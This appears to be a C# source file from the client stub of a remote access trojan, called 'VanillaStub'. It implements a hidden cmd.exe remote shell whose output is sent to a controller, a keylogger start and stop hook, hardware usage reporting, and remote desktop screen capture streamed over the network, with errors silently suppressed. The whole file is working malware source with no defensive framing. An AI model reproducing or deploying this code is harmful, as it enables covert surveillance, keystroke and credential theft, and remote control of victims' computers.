using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using VanillaStub.Helpers.Services.StreamLibrary;
using VanillaStub.Helpers.Services.StreamLibrary.UnsafeCodecs;

namespace VanillaStub.Helpers.Services
{
    public static class RemoteShellStream
    {
        private static Thread RemoteShellThread = new Thread(StartRemoteShell);
        private static bool RemoteShellActive { get; set; }
        private static string LastInput { get; set; }
        public static string Input { get; set; }
        public static bool WriteLine { get; set; }

        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        public static void Start()
        {
            if (!RemoteShellActive)
            {
                RemoteShellActive = true;
                try
                {
                    RemoteShellThread.Start();
                }
                catch { }
            }
        }

        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        public static void Stop()
        {
            if (RemoteShellActive)
            {
                RemoteShellActive = false;
                try
                {
                    RemoteShellThread.Abort();
                    RemoteShellThread = new Thread(StartRemoteShell);
                }
                catch { }
            }
        }

        private static void StartRemoteShell()
        {
            Process Shell = new Process();
            Shell.StartInfo.FileName = "cmd.exe";
            Shell.StartInfo.CreateNoWindow = true;
            Shell.StartInfo.UseShellExecute = false;
            Shell.StartInfo.RedirectStandardOutput = true;
            Shell.StartInfo.RedirectStandardInput = true;
            Shell.StartInfo.RedirectStandardError = true;
            Shell.OutputDataReceived += OutputHandler;
            Shell.Start();
            Shell.BeginOutputReadLine();
            while (RemoteShellActive)
            {
                if (!WriteLine) continue;
                LastInput = Input;
                Shell.StandardInput.WriteLine(Input);
                WriteLine = false;
            }
        }

        private static void OutputHandler(object SendingProcess, DataReceivedEventArgs OutData)
        {
            StringBuilder Output = new StringBuilder();
            if (!string.IsNullOrEmpty(OutData.Data))
                try
                {
                    Output.Append(OutData.Data);
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add((int) DataType.RemoteShellType);
                    ToSend.AddRange(Encoding.ASCII.GetBytes(Output.ToString()));
                    Networking.Networking.MainClient.Send(ToSend.ToArray());
                }
                catch { }
        }
    }

    public static class KeyloggerStream
    {
        private static readonly Keylogger K = new Keylogger();
        private static Thread KeyloggerThread = new Thread(StartKeylogger);
        private static bool KeyloggerActive { get; set; }

        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        public static void Start()
        {
            if (!KeyloggerActive)
            {
                KeyloggerActive = true;
                Keylogger.SendKeys = true;
                try
                {
                    KeyloggerThread.Start();
                }
                catch { }
            }
        }

        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        public static void Stop()
        {
            if (KeyloggerActive)
            {
                KeyloggerActive = false;
                Keylogger.SendKeys = false;
                try
                {
                    KeyloggerThread.Abort();
                    KeyloggerThread = new Thread(StartKeylogger);
                }
                catch { }
            }
        }

        private static void StartKeylogger()
        {
            K.InitKeylogger();
        }
    }

    public static class HardwareUsageStream
    {
        private static Thread HardwareUsageThread = new Thread(StartHardwareUsage);
        public static bool HardwareUsageActive { get; set; }

        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        public static void Start()
        {
            if (!HardwareUsageActive)
            {
                HardwareUsageActive = true;
                try
                {
                    HardwareUsageThread.Start();
                }
                catch { }
            }
        }

        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        public static void Stop()
        {
            if (HardwareUsageActive)
            {
                HardwareUsageActive = false;
                try
                {
                    HardwareUsageThread.Abort();
                    HardwareUsageThread = new Thread(StartHardwareUsage);
                }
                catch { }
            }
        }

        public static void StartHardwareUsage()
        {
            PerformanceCounter PCCPU = new PerformanceCounter("Processor", "% Processor Time", "_Total");
            PerformanceCounter PCMEM = new PerformanceCounter("Memory", "Available MBytes");
            PerformanceCounter PCDISK = new PerformanceCounter("PhysicalDisk", "% Disk Time", "_Total");
            while (HardwareUsageActive)
            {
                string Values = "{" + PCCPU.NextValue() + "}[" + PCMEM.NextValue() + "]<" + PCDISK.NextValue() + ">";
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int) DataType.HardwareUsageType);
                ToSend.AddRange(Encoding.ASCII.GetBytes(Values));
                Networking.Networking.MainClient.Send(ToSend.ToArray());
                Thread.Sleep(500);
            }
        }
    }

    public static class RemoteDesktopStream
    {
        private const int CURSOR_SHOWING = 0x00000001;
        private static Thread RemoteDestkopThread = new Thread(StartRemoteDestkop);
        public static bool RemoteDesktopActive { get; set; }

        [DllImport("user32.dll")]
        private static extern bool GetCursorInfo(out CursorInfo pci);

        [DllImport("user32.dll")]
        private static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);

        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        public static void Start()
        {
            if (!RemoteDesktopActive)
            {
                RemoteDesktopActive = true;
                try
                {
                    RemoteDestkopThread.Start();
                }
                catch { }
            }
        }

        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        public static void Stop()
        {
            if (RemoteDesktopActive)
            {
                RemoteDesktopActive = false;
                try
                {
                    RemoteDestkopThread.Abort();
                    RemoteDestkopThread = new Thread(StartRemoteDestkop);
                }
                catch { }
            }
        }

        private static async void StartRemoteDestkop()
        {
            while (RemoteDesktopActive)
            {
                byte[] ImageBytes = null;
                IUnsafeCodec UC = new UnsafeStreamCodec(50);
                Bitmap Image = GetDesktopImage();
                Rectangle Rect = new Rectangle(0, 0, Image.Width, Image.Height);
                Size S = new Size(Image.Width, Image.Height);
                BitmapData BD = Image.LockBits(new Rectangle(0, 0, Image.Width, Image.Height),
                    ImageLockMode.ReadWrite, Image.PixelFormat);
                using (MemoryStream MS = new MemoryStream(1000000000))
                {
                    UC.CodeImage(BD.Scan0, Rect, S,
                        Image.PixelFormat, MS);
                    ImageBytes = MS.ToArray();
                }

                List<byte> ToSend = new List<byte>();
                ToSend.Add((int)DataType.ImageType);
                ToSend.AddRange(ImageBytes);
                Networking.Networking.MainClient.Send(ToSend.ToArray());
                Image.UnlockBits(BD);
                Image.Dispose();               
            }
        }

        //Get image of desktop
        private static Bitmap GetDesktopImage()
        {
            Rectangle Rect = Screen.PrimaryScreen.Bounds;
            try
            {
                Bitmap BMP = new Bitmap(Rect.Width, Rect.Height, PixelFormat.Format32bppPArgb);
                Graphics G = Graphics.FromImage(BMP);
                G.CopyFromScreen(0, 0, 0, 0, new Size(BMP.Width, BMP.Height), CopyPixelOperation.SourceCopy);
                CursorInfo PCI;
                PCI.cbSize = Marshal.SizeOf(typeof(CursorInfo));
                if (GetCursorInfo(out PCI) && PCI.flags == CURSOR_SHOWING)
                {
                    DrawIcon(G.GetHdc(), PCI.ptScreenPos.x, PCI.ptScreenPos.y, PCI.hCursor);
                    G.ReleaseHdc();
                }

                G.Dispose();
                return BMP;
            }
            catch
            {
                return new Bitmap(Rect.Width, Rect.Height);
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct CursorInfo
        {
            public int cbSize;
            public readonly int flags;
            public readonly IntPtr hCursor;
            public readonly PointAPI ptScreenPos;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PointAPI
        {
            public readonly int x;
            public readonly int y;
        }
    }
}